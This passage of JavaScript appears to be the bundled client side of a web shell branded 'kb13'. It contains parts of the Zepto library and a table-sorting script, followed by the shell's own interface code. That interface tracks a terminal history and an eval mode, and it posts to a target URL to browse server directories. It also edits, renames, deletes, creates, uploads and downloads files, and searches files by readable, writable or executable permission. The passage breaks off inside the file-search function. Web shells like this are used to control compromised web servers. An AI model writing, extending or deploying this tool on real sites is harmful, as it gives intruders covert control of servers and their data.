        protocol = /^([\w-]+:)\/\//.test(settings.url) ? RegExp.$1 : window.location.protocol,
        xhr = settings.xhr(),
        nativeSetHeader = xhr.setRequestHeader,
        abortTimeout;
      deferred && deferred.promise(xhr), settings.crossDomain || setHeader("X-Requested-With", "XMLHttpRequest"), setHeader("Accept", mime || "*/*");
      if (mime = settings.mimeType || mime) mime.indexOf(",") > -1 && (mime = mime.split(",", 2)[0]), xhr.overrideMimeType && xhr.overrideMimeType(mime);
      (settings.contentType || settings.contentType !== !1 && settings.data && settings.type.toUpperCase() != "GET") && setHeader("Content-Type", settings.contentType || "application/x-www-form-urlencoded");
      if (settings.headers)
        for (name in settings.headers) setHeader(name, settings.headers[name]);
      xhr.setRequestHeader = setHeader, xhr.onreadystatechange = function() {
        if (xhr.readyState == 4) {
          xhr.onreadystatechange = empty, clearTimeout(abortTimeout);
          var result, error = !1;
          if (xhr.status >= 200 && xhr.status < 300 || xhr.status == 304 || xhr.status == 0 && protocol == "file:") {
            dataType = dataType || mimeToDataType(settings.mimeType || xhr.getResponseHeader("content-type")), result = xhr.responseText;
            try {
              dataType == "script" ? (1, eval)(result) : dataType == "xml" ? result = xhr.responseXML : dataType == "json" && (result = blankRE.test(result) ? null : $.parseJSON(result))
            } catch (e) {
              error = e
            }
            error ? ajaxError(error, "parsererror", xhr, settings, deferred) : ajaxSuccess(result, xhr, settings, deferred)
          } else ajaxError(xhr.statusText || null, xhr.status ? "error" : "abort", xhr, settings, deferred)
        }
      };
      if (ajaxBeforeSend(xhr, settings) === !1) return xhr.abort(), ajaxError(null, "abort", xhr, settings, deferred), xhr;
      if (settings.xhrFields)
        for (name in settings.xhrFields) xhr[name] = settings.xhrFields[name];
      var async = "async" in settings ? settings.async : !0;
      xhr.open(settings.type, settings.url, async, settings.username, settings.password);
      for (name in headers) nativeSetHeader.apply(xhr, headers[name]);
      return settings.timeout > 0 && (abortTimeout = setTimeout(function() {
        xhr.onreadystatechange = empty, xhr.abort(), ajaxError(null, "timeout", xhr, settings, deferred)
      }, settings.timeout)), xhr.send(settings.data ? settings.data : null), xhr
    }, $.get = function(a, b, c, d) {
      return $.ajax(parseArguments.apply(null, arguments))
    }, $.post = function(a, b, c, d) {
      var e = parseArguments.apply(null, arguments);
      return e.type = "POST", $.ajax(e)
    }, $.getJSON = function(a, b, c) {
      var d = parseArguments.apply(null, arguments);
      return d.dataType = "json", $.ajax(d)
    }, $.fn.load = function(a, b, c) {
      if (!this.length) return this;
      var d = this,
        e = a.split(/\s/),
        f, g = parseArguments(a, b, c),
        h = g.success;
      return e.length > 1 && (g.url = e[0], f = e[1]), g.success = function(a) {
        d.html(f ? $("<div>").html(a.replace(rscript, "")).find(f) : a), h && h.apply(d, arguments)
      }, $.ajax(g), this
    };
    var escape = encodeURIComponent;
    $.param = function(a, b) {
      var c = [];
      return c.add = function(a, b) {
        this.push(escape(a) + "=" + escape(b))
      }, serialize(c, a, b), c.join("&").replace(/%20/g, "+")
    }
  }(Zepto),
  function(a) {
    a.fn.serializeArray = function() {
      var b = [],
        c;
      return a([].slice.call(this.get(0).elements)).each(function() {
        c = a(this);
        var d = c.attr("type");
        this.nodeName.toLowerCase() != "fieldset" && !this.disabled && d != "submit" && d != "reset" && d != "button" && (d != "radio" && d != "checkbox" || this.checked) && b.push({
          name: c.attr("name"),
          value: c.val()
        })
      }), b
    }, a.fn.serialize = function() {
      var a = [];
      return this.serializeArray().forEach(function(b) {
        a.push(encodeURIComponent(b.name) + "=" + encodeURIComponent(b.value))
      }), a.join("&")
    }, a.fn.submit = function(b) {
      if (b) this.bind("submit", b);
      else if (this.length) {
        var c = a.Event("submit");
        this.eq(0).trigger(c), c.isDefaultPrevented() || this.get(0).submit()
      }
      return this
    }
  }(Zepto),
  function(a) {
    "__proto__" in {} || a.extend(a.zepto, {
      Z: function(b, c) {
        return b = b || [], a.extend(b, a.fn), b.selector = c || "", b.__Z = !0, b
      },
      isZ: function(b) {
        return a.type(b) === "array" && "__Z" in b
      }
    });
    try {
      getComputedStyle(undefined)
    } catch (b) {
      var c = getComputedStyle;
      window.getComputedStyle = function(a) {
        try {
          return c(a)
        } catch (b) {
          return null
        }
      }
    }
  }(Zepto)
var h = !0,
  j = !1;
sorttable = {
  e: function() {
    arguments.callee.i || (arguments.callee.i = h, k && clearInterval(k), document.createElement && document.getElementsByTagName && (sorttable.a = /^(\d\d?)[\/\.-](\d\d?)[\/\.-]((\d\d)?\d\d)$/, l(document.getElementsByTagName("table"), function(a) {
      -1 != a.className.search(/\bsortable\b/) && sorttable.k(a)
    })))
  },
  k: function(a) {
    0 == a.getElementsByTagName("thead").length && (the = document.createElement("thead"), the.appendChild(a.rows[0]), a.insertBefore(the, a.firstChild));
    null == a.tHead && (a.tHead = a.getElementsByTagName("thead")[0]);
    if (1 == a.tHead.rows.length) {
      sortbottomrows = [];
      for (var b = 0; b < a.rows.length; b++) - 1 != a.rows[b].className.search(/\bsortbottom\b/) && (sortbottomrows[sortbottomrows.length] = a.rows[b]);
      if (sortbottomrows) {
        null == a.tFoot && (tfo = document.createElement("tfoot"), a.appendChild(tfo));
        for (b = 0; b < sortbottomrows.length; b++) tfo.appendChild(sortbottomrows[b]);
        delete sortbottomrows
      }
      headrow = a.tHead.rows[0].cells;
      for (b = 0; b < headrow.length; b++)
        if (!headrow[b].className.match(/\bsorttable_nosort\b/)) {
          (mtch = headrow[b].className.match(/\bsorttable_([a-z0-9]+)\b/)) && (override = mtch[1]);
          headrow[b].p = mtch && "function" == typeof sorttable["sort_" + override] ? sorttable["sort_" + override] : sorttable.j(a, b);
          headrow[b].o = b;
          headrow[b].c = a.tBodies[0];
          var c = headrow[b],
            e = sorttable.q = function() {
              if (-1 != this.className.search(/\bsorttable_sorted\b/)) sorttable.reverse(this.c), this.className = this.className.replace("sorttable_sorted", "sorttable_sorted_reverse"), this.removeChild(document.getElementById("sorttable_sortfwdind")), sortrevind = document.createElement("span"), sortrevind.id = "sorttable_sortrevind", sortrevind.innerHTML = "&nbsp;&#x25B4;", this.appendChild(sortrevind);
              else if (-1 != this.className.search(/\bsorttable_sorted_reverse\b/)) sorttable.reverse(this.c), this.className = this.className.replace("sorttable_sorted_reverse", "sorttable_sorted"), this.removeChild(document.getElementById("sorttable_sortrevind")), sortfwdind = document.createElement("span"), sortfwdind.id = "sorttable_sortfwdind", sortfwdind.innerHTML = "&nbsp;&#x25BE;", this.appendChild(sortfwdind);
              else {
                theadrow = this.parentNode;
                l(theadrow.childNodes, function(a) {
                  1 == a.nodeType && (a.className = a.className.replace("sorttable_sorted_reverse", ""), a.className = a.className.replace("sorttable_sorted", ""))
                });
                (sortfwdind = document.getElementById("sorttable_sortfwdind")) && sortfwdind.parentNode.removeChild(sortfwdind);
                (sortrevind = document.getElementById("sorttable_sortrevind")) && sortrevind.parentNode.removeChild(sortrevind);
                this.className += " sorttable_sorted";
                sortfwdind = document.createElement("span");
                sortfwdind.id = "sorttable_sortfwdind";
                sortfwdind.innerHTML = "&nbsp;&#x25BE;";
                this.appendChild(sortfwdind);
                row_array = [];
                col = this.o;
                rows = this.c.rows;
                for (var a = 0; a < rows.length; a++) row_array[row_array.length] = [sorttable.d(rows[a].cells[col]), rows[a]];
                row_array.sort(this.p);
                tb = this.c;
                for (a = 0; a < row_array.length; a++) tb.appendChild(row_array[a][1]);
                delete row_array
              }
            };
          if (c.addEventListener) c.addEventListener("click", e, j);
          else {
            e.f || (e.f = n++);
            c.b || (c.b = {});
            var g = c.b.click;
            g || (g = c.b.click = {}, c.onclick && (g[0] = c.onclick));
            g[e.f] = e;
            c.onclick = p
          }
        }
    }
  },
  j: function(a, b) {
    sortfn = sorttable.l;
    for (var c = 0; c < a.tBodies[0].rows.length; c++)
      if (text = sorttable.d(a.tBodies[0].rows[c].cells[b]), "" != text) {
        if (text.match(/^-?[\u00a3$\u00a4]?[\d,.]+%?$/)) return sorttable.n;
        if (possdate = text.match(sorttable.a)) {
          first = parseInt(possdate[1]);
          second = parseInt(possdate[2]);
          if (12 < first) return sorttable.g;
          if (12 < second) return sorttable.m;
          sortfn = sorttable.g
        }
      }
    return sortfn
  },
  d: function(a) {
    if (!a) return "";
    hasInputs = "function" == typeof a.getElementsByTagName && a.getElementsByTagName("input").length;
    if ("" != a.title) return a.title;
    if ("undefined" != typeof a.textContent && !hasInputs) return a.textContent.replace(/^\s+|\s+$/g, "");
    if ("undefined" != typeof a.innerText && !hasInputs) return a.innerText.replace(/^\s+|\s+$/g, "");
    if ("undefined" != typeof a.text && !hasInputs) return a.text.replace(/^\s+|\s+$/g, "");
    switch (a.nodeType) {
      case 3:
        if ("input" == a.nodeName.toLowerCase()) return a.value.replace(/^\s+|\s+$/g, "");
      case 4:
        return a.nodeValue.replace(/^\s+|\s+$/g, "");
      case 1:
      case 11:
        for (var b = "", c = 0; c < a.childNodes.length; c++) b += sorttable.d(a.childNodes[c]);
        return b.replace(/^\s+|\s+$/g, "");
      default:
        return ""
    }
  },
  reverse: function(a) {
    newrows = [];
    for (var b = 0; b < a.rows.length; b++) newrows[newrows.length] = a.rows[b];
    for (b = newrows.length - 1; 0 <= b; b--) a.appendChild(newrows[b]);
    delete newrows
  },
  n: function(a, b) {
    aa = parseFloat(a[0].replace(/[^0-9.-]/g, ""));
    isNaN(aa) && (aa = 0);
    bb = parseFloat(b[0].replace(/[^0-9.-]/g, ""));
    isNaN(bb) && (bb = 0);
    return aa - bb
  },
  l: function(a, b) {
    return a[0].toLowerCase() == b[0].toLowerCase() ? 0 : a[0].toLowerCase() < b[0].toLowerCase() ? -1 : 1
  },
  g: function(a, b) {
    mtch = a[0].match(sorttable.a);
    y = mtch[3];
    m = mtch[2];
    d = mtch[1];
    1 == m.length && (m = "0" + m);
    1 == d.length && (d = "0" + d);
    dt1 = y + m + d;
    mtch = b[0].match(sorttable.a);
    y = mtch[3];
    m = mtch[2];
    d = mtch[1];
    1 == m.length && (m = "0" + m);
    1 == d.length && (d = "0" + d);
    dt2 = y + m + d;
    return dt1 == dt2 ? 0 : dt1 < dt2 ? -1 : 1
  },
  m: function(a, b) {
    mtch = a[0].match(sorttable.a);
    y = mtch[3];
    d = mtch[2];
    m = mtch[1];
    1 == m.length && (m = "0" + m);
    1 == d.length && (d = "0" + d);
    dt1 = y + m + d;
    mtch = b[0].match(sorttable.a);
    y = mtch[3];
    d = mtch[2];
    m = mtch[1];
    1 == m.length && (m = "0" + m);
    1 == d.length && (d = "0" + d);
    dt2 = y + m + d;
    return dt1 == dt2 ? 0 : dt1 < dt2 ? -1 : 1
  },
  r: function(a, b) {
    for (var c = 0, e = a.length - 1, g = h; g;) {
      for (var g = j, f = c; f < e; ++f) 0 < b(a[f], a[f + 1]) && (g = a[f], a[f] = a[f + 1], a[f + 1] = g, g = h);
      e--;
      if (!g) break;
      for (f = e; f > c; --f) 0 > b(a[f], a[f - 1]) && (g = a[f], a[f] = a[f - 1], a[f - 1] = g, g = h);
      c++
    }
  }
};
document.addEventListener && document.addEventListener("DOMContentLoaded", sorttable.e, j);
if (/WebKit/i.test(navigator.userAgent)) var k = setInterval(function() {
  /loaded|complete/.test(document.readyState) && sorttable.e()
}, 10);
window.onload = sorttable.e;
var n = 1;

function p(a) {
  var b = h;
  a || (a = ((this.ownerDocument || this.document || this).parentWindow || window).event, a.preventDefault = q, a.stopPropagation = r);
  var c = this.b[a.type],
    e;
  for (e in c) this.h = c[e], this.h(a) === j && (b = j);
  return b
}

function q() {
  this.returnValue = j
}

function r() {
  this.cancelBubble = h
}
Array.forEach || (Array.forEach = function(a, b, c) {
  for (var e = 0; e < a.length; e++) b.call(c, a[e], e, a)
});
Function.prototype.forEach = function(a, b, c) {
  for (var e in a) "undefined" == typeof this.prototype[e] && b.call(c, a[e], e, a)
};
String.forEach = function(a, b, c) {
  Array.forEach(a.split(""), function(e, g) {
    b.call(c, e, g, a)
  })
};

function l(a, b) {
  if (a) {
    var c = Object;
    if (a instanceof Function) c = Function;
    else {
      if (a.forEach instanceof Function) {
        a.forEach(b, void 0);
        return
      }
      "string" == typeof a ? c = String : "number" == typeof a.length && (c = Array)
    }
    c.forEach(a, b, void 0)
  }
};
var loading_count = 0;
var running = false;
var defaultTab = 'explorer';
var currentTab = $('#' + defaultTab);
var tabScroll = new Object;
var onDrag = false;
var onScroll = false;
var scrollDelta = 1;
var scrollCounter = 0;
var scrollSpeed = 60;
var scrollTimer = '';
var dragX = '';
var dragY = '';
var dragDeltaX = '';
var dragDeltaY = '';
var editSuccess = '';
var terminalHistory = new Array();
var terminalHistoryPos = 0;
var evalSupported = "";
var evalReady = false;
var resizeTimer = '';
var portableWidth = 700;
var portableMode = null;
Zepto(function($) {
  if (init_shell) {
    var now = new Date();
    output("started @ " + now.toGMTString());
    output("cwd : " + get_cwd());
    output("module : " + module_to_load);
    show_tab();
    xpl_bind();
    eval_init();
    window_resize();
    xpl_update_status();
    $(window).on('resize', function(e) {
      clearTimeout(resizeTimer);
      resizeTimer = setTimeout("window_resize()", 1000)
    });
    $('.menuitem').on('click', function(e) {
      selectedTab = $(this).attr('href').substr(2);
      show_tab(selectedTab)
    });
    $('#logout').on('click', function(e) {
      var cookie = document.cookie.split(';');
      for (var i = 0; i < cookie.length; i++) {
        var entries = cookie[i],
          entry = entries.split("="),
          name = entry[0];
        document.cookie = name + "=''; expires=Thu, 01 Jan 1970 00:00:01 GMT; path=/"
      }
      localStorage.clear();
      location.href = targeturl
    });
    $('#totop').on('click', function(e) {
      $(window).scrollTop(0)
    });
    $('#totop').on('mouseover', function(e) {
      onScroll = true;
      clearTimeout(scrollTimer);
      start_scroll('top')
    });
    $('#totop').on('mouseout', function(e) {
      onScroll = false;
      scrollCounter = 0
    });
    $('#tobottom').on('click', function(e) {
      $(window).scrollTop($(document).height() - $(window).height())
    });
    $('#tobottom').on('mouseover', function(e) {
      onScroll = true;
      clearTimeout(scrollTimer);
      start_scroll('bottom')
    });
    $('#tobottom').on('mouseout', function(e) {
      onScroll = false;
      scrollCounter = 0
    });
    $('#basicInfo').on('mouseenter', function(e) {
      $('#toggleBasicInfo').show()
    });
    $('#basicInfo').on('mouseleave', function(e) {
      $('#toggleBasicInfo').hide()
    });
    $('#toggleBasicInfo').on('click', function(e) {
      $('#basicInfo').hide();
      $('#showinfo').show();
      $('#toggleBasicInfo').hide();
      localStorage.setItem('infoBarShown', 'hidden')
    });
    $('#showinfo').on('click', function(e) {
      $('#basicInfo').show();
      $('#showinfo').hide();
      localStorage.setItem('infoBarShown', 'shown')
    });
    if ((infoBarShown = localStorage.getItem('infoBarShown'))) {
      if (infoBarShown == 'shown') {
        $('#basicInfo').show();
        $('#showinfo').hide()
      } else {
        $('#basicInfo').hide();
        $('#showinfo').show();
        $('#toggleBasicInfo').hide()
      }
    } else {
      info_refresh()
    }
    if (history.pushState) {
      window.onpopstate = function(event) {
        refresh_tab()
      }
    } else {
      window.historyEvent = function(event) {
        refresh_tab()
      }
    }
  }
});

function output(str) {
  console.log('kb13> ' + str)
}

function window_resize() {
  bodyWidth = $('body').width();
  if (bodyWidth <= portableWidth) {
    layout_portable()
  } else {
    layout_normal()
  }
}

function layout_portable() {
  nav = $('#nav');
  menu = $('#menu');
  headerNav = $('#headerNav');
  content = $('#content');
  nav.prependTo('#content');
  nav.css('padding', '5px 8px');
  nav.css('margin-top', '8px');
  nav.css('display', 'block');
  nav.addClass('border');
  menu.children().css('width', '100%');
  menu.hide();
  $('#menuButton').remove();
  headerNav.prepend("<div id='menuButton' class='boxtitle' onclick=\"$('#menu').toggle();\" style='float-left;display:inline;padding:4px 8px;margin-right:8px;'>menu</div>");
  menu.attr('onclick', "\$('#menu').hide();");
  $('#xplTable tr>:nth-child(4)').hide();
  $('#xplTable tr>:nth-child(5)').hide();
  if (!win) {
    $('#xplTable tr>:nth-child(6)').hide()
  }
  tblfoot = $('#xplTable tfoot td:last-child');
  if (tblfoot[0]) tblfoot[0].colSpan = 1;
  if (tblfoot[1]) tblfoot[1].colSpan = 2;
  $('.box').css('width', '100%');
  $('.box').css('height', '100%');
  $('.box').css('left', '0px');
  $('.box').css('top', '0px');
  paddingTop = $('#header').height();
  content.css('padding-top', paddingTop + 'px');
  portableMode = true
}

function layout_normal() {
  nav = $('#nav');
  menu = $('#menu');
  content = $('#content');
  nav.insertAfter('#kb13');
  nav.css('padding', '0');
  nav.css('margin-top', '0');
  nav.css('display', 'inline');
  nav.removeClass('border');
  menu.children().css('width', 'auto');
  menu.show();
  $('#menuButton').remove();
  menu.attr('onclick', "");
  $('#xplTable tr>:nth-child(4)').show();
  $('#xplTable tr>:nth-child(5)').show();
  if (!win) {
    $('#xplTable tr>:nth-child(6)').show();
    colspan = 4
  } else colspan = 3;
  tblfoot = $('#xplTable tfoot td:last-child');
  if (tblfoot[0]) tblfoot[0].colSpan = colspan;
  if (tblfoot[1]) tblfoot[1].colSpan = colspan + 1;
  paddingTop = $('#header').height();
  content.css('padding-top', paddingTop + 'px');
  portableMode = false
}

function start_scroll(str) {
  if (str == 'top') {
    to = $(window).scrollTop() - scrollCounter;
    scrollCounter = scrollDelta + scrollCounter;
    if (to <= 0) {
      to = 0;
      onScroll = false
    } else if (onScroll) {
      scrollTimer = setTimeout("start_scroll('top')", scrollSpeed);
      $(window).scrollTop(to)
    }
  } else if (str == 'bottom') {
    to = $(window).scrollTop() + scrollCounter;
    scrollCounter = scrollDelta + scrollCounter;
    bottom = $(document).height() - $(window).height();
    if (to >= bottom) {
      to = bottom;
      onScroll = false
    } else if (onScroll) {
      scrollTimer = setTimeout("start_scroll('bottom')", scrollSpeed);
      $(window).scrollTop(to)
    }
  }
}

function get_cwd() {
  return decodeURIComponent(get_cookie('cwd'))
}

function fix_tabchar(el, e) {
  if (e.keyCode == 9) {
    e.preventDefault();
    var s = el.selectionStart;
    el.value = el.value.substring(0, el.selectionStart) + "\t" + el.value.substring(el.selectionEnd);
    el.selectionEnd = s + 1
  }
}

function get_cookie(key) {
  var res;
  return (res = new RegExp('(?:^|; )' + encodeURIComponent(key) + '=([^;]*)').exec(document.cookie)) ? (res[1]) : null
}

function set_cookie(key, value) {
  document.cookie = key + '=' + encodeURIComponent(value)
}

function html_safe(str) {
  if (typeof(str) == "string") {
    str = str.replace(/&/g, "&amp;");
    str = str.replace(/"/g, "&quot;");
    str = str.replace(/'/g, "&#039;");
    str = str.replace(/</g, "&lt;");
    str = str.replace(/>/g, "&gt;")
  }
  return str
}

function ucfirst(str) {
  return str.charAt(0).toUpperCase() + str.slice(1)
}

function time() {
  var d = new Date();
  return d.getTime()
}

function send_post(targetdata, callback, loading) {
  if (loading == null) loading_start();
  $.ajax({
    url: targeturl,
    type: 'POST',
    data: targetdata,
    success: function(res) {
      callback(res);
      if (loading == null) loading_stop()
    },
    error: function() {
      if (loading == null) loading_stop()
    }
  })
}

function loading_start() {
  if (!running) {
    $('#overlay').show();
    running = true;
    loading_loop()
  }
}

function loading_loop() {
  if (running) {
    img = $('#loading');
    img.css('transform', 'rotate(' + loading_count + 'deg)');
    img.css('-ms-transform', 'rotate(' + loading_count + 'deg)');
    img.css('-webkit-transform', 'rotate(' + loading_count + 'deg)');
    loading_count += 7;
    if (loading_count > 360) loading_count = 0;
    if (running) setTimeout("loading_loop()", 20)
  }
}

function loading_stop() {
  if (running) {
    img = $('#loading');
    img.css('transform', 'rotate(0deg)');
    img.css('-ms-transform', 'rotate(0deg)');
    img.css('-webkit-transform', 'rotate(0deg)');
    $('#overlay').hide();
    running = false
  }
}

function show_tab(id) {
  if (!id) {
    if (location.hash != '') id = location.hash.substr(2);
    else id = defaultTab
  }
  refresh_tab(id)
}

function refresh_tab(id) {
  if (!id) {
    if (location.hash != '') id = location.hash.substr(2);
    else id = defaultTab
  }
  $('.menuitemSelected').removeClass("menuitemSelected");
  $('#menu' + id).addClass("menuitemSelected");
  tabScroll[currentTab.attr('id')] = $(window).scrollTop();
  currentTab.hide();
  currentTab = $('#' + id);
  currentTab.show();
  window[id]();
  if (tabScroll[id]) {
    $(window).scrollTop(tabScroll[id])
  }
  hide_box()
}

function trap_enter(e, callback) {
  if (e.keyCode == 13) {
    if (callback != null) window[callback]()
  }
}

function show_box(title, content) {
  onDrag = false;
  hide_box();
  box = "<div class='box'><p class='boxtitle'>" + title + "<span class='boxclose floatRight'>x</span></p><div class='boxcontent'>" + content + "</div><div class='boxresult'></div></div>";
  $('#content').append(box);
  box_width = $('.box').width();
  body_width = $('body').width();
  box_height = $('.box').height();
  body_height = $('body').height();
  x = (body_width - box_width) / 2;
  y = (body_height - box_height) / 2;
  if (x < 0 || portableMode) x = 0;
  if (y < 0 || portableMode) y = 0;
  if (portableMode) {
    $('.box').css('width', '100%');
    $('.box').css('height', '100%')
  }
  $('.box').css('left', x + 'px');
  $('.box').css('top', y + 'px');
  $('.boxclose').on('click', function(e) {
    hide_box()
  });
  if (!portableMode) {
    $('.boxtitle').on('click', function(e) {
      if (!onDrag) {
        dragDeltaX = e.pageX - parseInt($('.box').css('left'));
        dragDeltaY = e.pageY - parseInt($('.box').css('top'));
        drag_start()
      } else drag_stop()
    })
  }
  $(document).off('keyup');
  $(document).on('keyup', function(e) {
    if (e.keyCode == 27) hide_box()
  });
  if ($('.box input')[0]) $('.box input')[0].focus()
}

function hide_box() {
  $(document).off('keyup');
  $('.box').remove()
}

function drag_start() {
  if (!onDrag) {
    onDrag = true;
    $('body').off('mousemove');
    $('body').on('mousemove', function(e) {
      dragX = e.pageX;
      dragY = e.pageY
    });
    setTimeout('drag_loop()', 50)
  }
}

function drag_loop() {
  if (onDrag) {
    x = dragX - dragDeltaX;
    y = dragY - dragDeltaY;
    if (y < 0) y = 0;
    $('.box').css('left', x + 'px');
    $('.box').css('top', y + 'px');
    setTimeout('drag_loop()', 50)
  }
}

function drag_stop() {
  onDrag = false;
  $('body').off('mousemove')
}

function get_all_cbox_selected(id, callback) {
  var buffer = new Array();
  $('#' + id).find('.cBoxSelected').not('.cBoxAll').each(function(i) {
    if ((href = window[callback]($(this)))) {
      buffer[i] = href
    }
  });
  return buffer
}

function cbox_bind(id, callback) {
  $('#' + id).find('.cBox').off('click');
  $('#' + id).find('.cBoxAll').off('click');
  $('#' + id).find('.cBox').on('click', function(e) {
    if ($(this).hasClass('cBoxSelected')) {
      $(this).removeClass('cBoxSelected')
    } else $(this).addClass('cBoxSelected');
    if (callback != null) window[callback]()
  });
  $('#' + id).find('.cBoxAll').on('click', function(e) {
    if ($(this).hasClass('cBoxSelected')) {
      $('#' + id).find('.cBox').removeClass('cBoxSelected');
      $('#' + id).find('.cBoxAll').removeClass('cBoxSelected')
    } else {
      $('#' + id).find('.cBox').not('.cBoxException').addClass('cBoxSelected');
      $('#' + id).find('.cBoxAll').not('.cBoxException').addClass('cBoxSelected')
    }
    if (callback != null) window[callback]()
  })
}

function action(path, type) {
  title = "Action";
  content = '';
  if (type == 'file') content = "<table class='boxtbl'><tr><td><input type='text' value='" + path + "' disabled></td></tr><tr data-path='" + path + "'><td><span class='edit button'>edit</span><span class='ren button'>rename</span><span class='del button'>delete</span><span class='dl button'>download</span></td></tr></table>";
  if (type == 'dir') content = "<table class='boxtbl'><tr><td><input type='text' value='" + path + "' disabled></td></tr><tr data-path='" + path + "'><td><span class='find button'>find</span><span class='ul button'>upload</span><span class='ren button'>rename</span><span class='del button'>delete</span></td></tr></table>";
  if (type == 'dot') content = "<table class='boxtbl'><tr><td><input type='text' value='" + path + "' disabled></td></tr><tr data-path='" + path + "'><td><span class='find button'>find</span><span class='ul button'>upload</span><span class='ren button'>rename</span><span class='del button'>delete</span><span class='newfile button'>new file</span><span class='newfolder button'>new folder</span></td></tr></table>";
  show_box(title, content);
  xpl_bind()
}

function navigate(path, showfiles) {
  if (showfiles == null) showfiles = 'true';
  send_post({
    cd: path,
    showfiles: showfiles
  }, function(res) {
    if (res != 'error') {
      splits = res.split('{[|kb13|]}');
      if (splits.length == 3) {
        $('#nav').html(splits[1]);
        if (showfiles == 'true') {
          $('#explorer').html('');
          $('#explorer').html(splits[2]);
          sorttable.k($('#xplTable').get(0))
        }
        $('#terminalCwd').html(html_safe(get_cwd()) + '&gt;');
        xpl_bind();
        window_resize()
      }
    }
  })
}

function view(path, type, preserveTimestamp) {
  if (preserveTimestamp == null) preserveTimestamp = 'true';
  send_post({
    viewFile: path,
    viewType: type,
    preserveTimestamp: preserveTimestamp
  }, function(res) {
    if (res != 'error') {
      $('#explorer').html('');
      $('#explorer').html(res);
      xpl_bind();
      show_tab('explorer');
      if ((type == 'edit') || (type == 'hex')) {
        editResult = (type == 'edit') ? $('#editResult') : $('#editHexResult');
        if (editSuccess == 'success') {
          editResult.html(' ( File saved )')
        } else if (editSuccess == 'error') {
          editResult.html(' ( Failed to save file )')
        }
        editSuccess = ''
      }
      cbox_bind('editTbl')
    }
  })
}

function view_entry(el) {
  if ($(el).attr('data-path') != '') {
    entry = $(el).attr('data-path');
    $('#form').append("<input type='hidden' name='viewEntry' value='" + entry + "'>");
    $('#form').submit();
    $('#form').html('')
  }
}

function ren(path) {
  title = "Rename";
  content = "<table class='boxtbl'><tr><td class='colFit'>Rename to</td><td><input type='text' class='renameFileTo' value='" + path + "' onkeydown=\"trap_enter(event, 'ren_go');\"><input type='hidden' class='renameFile' value='" + path + "'></td></tr><tr><td colspan='2'><span class='button' onclick='ren_go();'>rename</span></td></tr></table>";
  show_box(title, content)
}

function ren_go() {
  renameFile = $('.renameFile').val();
  renameFileTo = $('.renameFileTo').val();
  send_post({
    renameFile: renameFile,
    renameFileTo: renameFileTo
  }, function(res) {
    if (res != 'error') {
      navigate(res);
      $('.boxresult').html('Operation(s) succeeded');
      $('.renameFile').val($('.renameFileTo').val())
    } else $('.boxresult').html('Operation(s) failed')
  })
}

function newfolder(path) {
  title = "New Folder";
  path = path + 'newfolder-' + time();
  content = "<table class='boxtbl'><tr><td class='colFit'>Folder Name</td><td><input type='text' class='newFolder' value='" + path + "' onkeydown=\"trap_enter(event, 'newfolder_go');\"></td></tr><tr><td colspan='2'><span class='button' onclick='newfolder_go();'>create</span></td></tr></table>";
  show_box(title, content)
}

function newfolder_go() {
  newFolder = $('.newFolder').val();
  send_post({
    newFolder: newFolder
  }, function(res) {
    if (res != 'error') {
      navigate(res);
      $('.boxresult').html('Operation(s) succeeded')
    } else $('.boxresult').html('Operation(s) failed')
  })
}

function newfile(path) {
  title = "New File";
  path = path + 'newfile-' + time();
  content = "<table class='boxtbl'><tr><td class='colFit'>File Name</td><td><input type='text' class='newFile' value='" + path + "' onkeydown=\"trap_enter(event, 'newfile_go');\"></td></tr><tr><td colspan='2'><span class='button' onclick='newfile_go();'>create</span></td></tr></table>";
  show_box(title, content)
}

function newfile_go() {
  newFile = $('.newFile').val();
  send_post({
    newFile: newFile
  }, function(res) {
    if (res != 'error') {
      view(newFile, 'edit');
      $('.boxresult').html('Operation(s) succeeded')
    } else $('.boxresult').html('Operation(s) failed')
  })
}

function viewfileorfolder() {
  title = "View File / Folder";
  content = "<table class='boxtbl'><tr><td><input type='text' class='viewFileorFolder' value='" + html_safe(get_cwd()) + "' onkeydown=\"trap_enter(event, 'viewfileorfolder_go');\"></td></tr><tr><td><span class='button' onclick='viewfileorfolder_go();'>view</span></td></tr></table>";
  show_box(title, content)
}

function viewfileorfolder_go() {
  entry = $('.viewFileorFolder').val();
  send_post({
    viewFileorFolder: entry
  }, function(res) {
    if (res != 'error') {
      if (res == 'file') {
        view(entry, 'auto');
        show_tab('explorer')
      } else if (res == 'folder') {
        navigate(entry);
        show_tab('explorer')
      }
    }
  })
}

function del(path) {
  title = "Delete";
  content = "<table class='boxtbl'><tr><td class='colFit'>Delete</td><td><input type='text' class='delete' value='" + path + "' onkeydown=\"trap_enter(event, 'delete_go');\"></td></tr><tr><td colspan='2'><span class='button' onclick='delete_go();'>delete</span></td></tr></table>";
  show_box(title, content)
}

function delete_go() {
  path = $('.delete').val();
  send_post({
    delete: path
  }, function(res) {
    if (res != 'error') {
      navigate(res);
      $('.boxresult').html('Operation(s) succeeded')
    } else $('.boxresult').html('Operation(s) failed')
  })
}

function find(path) {
  findfile = "<table class='boxtbl'><thead><tr><th colspan='2'><p class='boxtitle'>Find File</p></th></tr></thead><tbody><tr><td style='width:144px'>Search in</td><td><input type='text' class='findfilePath' value='" + path + "' onkeydown=\"trap_enter(event, 'find_go_file');\"></td></tr><tr><td style='border-bottom:none;'>Filename contains</td><td style='border-bottom:none;'><input type='text' class='findfileFilename' onkeydown=\"trap_enter(event, 'find_go_file');\"></td></tr><tr><td></td><td><span class='cBox findfileFilenameRegex'></span><span class='floatLeft'>Regex</span>&nbsp;&nbsp;<span class='cBox findfileFilenameInsensitive'></span><span class='floatLeft'>Case Insensitive</span></td></tr><tr><td style='border-bottom:none;'>File contains</td><td style='border-bottom:none;'><input type='text' class='findfileContains' onkeydown=\"trap_enter(event, 'find_go_file');\"></td></tr><tr><td></td><td><span class='cBox findfileContainsRegex'></span><span class='floatLeft'>Regex</span>&nbsp;&nbsp;<span class='cBox findfileContainsInsensitive'></span><span class='floatLeft'>Case Insensitive</span></td></tr><tr><td>Permissions</td><td><span class='cBox findfileReadable'></span><span class='floatLeft'>Readable</span>&nbsp;&nbsp;<span class='cBox findfileWritable'></span><span class='floatLeft'>Writable</span>&nbsp;&nbsp;<span class='cBox findfileExecutable'></span><span class='floatLeft'>Executable</span></td></tr></tbody><tfoot><tr><td><span class='button navbar' data-path='" + path + "'>explorer</span></td><td><span class='button' onclick=\"find_go_file();\">find</span></td></tr><tr><td colspan='2' class='findfileResult'></td></tr></tfoot></table>";
